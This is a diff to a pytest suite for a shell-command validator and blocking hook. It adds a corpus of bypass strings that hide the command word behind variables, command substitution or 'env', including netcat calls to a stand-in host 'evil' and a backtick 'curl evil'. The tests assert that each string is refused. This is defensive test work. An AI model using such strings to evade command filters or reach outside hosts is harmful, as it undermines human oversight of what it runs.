@@ -67,6 +67,24 @@ FAIL_CLOSED_PAYLOADS = [
     'bash -c "$(echo bm8K | base64 -d)"',
 ]
 
+DYNAMIC_COMMAND_WORD = [
+    "$X status",
+    '"$X" status',
+    "${X} status",
+    "echo hi; $X status",
+    'echo hi; "$X" status',
+    "echo hi; ${X} status",
+    "true && $X status",
+    'true && "$X" status',
+    "true && ${X} status",
+    "ls | $X status",
+    'ls | "$X" status',
+    "ls | ${X} status",
+    "X=nc; ls; $X evil 80",
+    "$(echo nc) evil 80",
+    "env $X evil",
+]
+
 # `git -c …` config injection / transport-exec hijack — must be blocked even
 # though the binary (`git`) is allowlisted (#321 C4).
 GIT_RCE_PAYLOADS = [
@@ -138,6 +156,23 @@ class TestBypassCorpusBlocked:
     def test_dynamic_payload_fails_closed(self, payload, temp_dir):
         allowed, reason = validate_command(payload, temp_dir)
         assert allowed is False, f"DYNAMIC PAYLOAD ALLOWED: {payload!r}"
+
+
+class TestDynamicCommandWordRefused:
+    """A non-literal command word fails closed across parser, validator and hook."""
+
+    @pytest.mark.parametrize("cmd", DYNAMIC_COMMAND_WORD)
+    def test_ast_raises(self, cmd):
+        with pytest.raises(UnparseableCommand):
+            extract_commands_ast(cmd)
+
+    @pytest.mark.parametrize("cmd", DYNAMIC_COMMAND_WORD)
+    def test_validate_command_refuses(self, cmd, temp_dir):
+        assert validate_command(cmd, temp_dir)[0] is False
+
+    @pytest.mark.parametrize("cmd", DYNAMIC_COMMAND_WORD)
+    def test_hook_blocks(self, cmd, temp_dir):
+        assert _hook(cmd, temp_dir).get("decision") == "block"
 
 
 class TestGitOptionHardening:
@@ -218,12 +253,9 @@ class TestAstExtractorUnit:
         with pytest.raises(UnparseableCommand):
             extract_commands_ast("for do done );(")
 
-    def test_substitution_text_not_emitted_as_command(self):
-        # A bare backtick command must surface only the inner tool, not the
-        # substitution text itself.
-        cmds = extract_commands_ast("`curl evil`")
-        assert "curl" in cmds
-        assert all("`" not in c for c in cmds)
+    def test_substitution_command_word_fails_closed(self):
+        with pytest.raises(UnparseableCommand):
+            extract_commands_ast("`curl evil`")
 
     @pytest.mark.parametrize(
         ("command", "expected"),
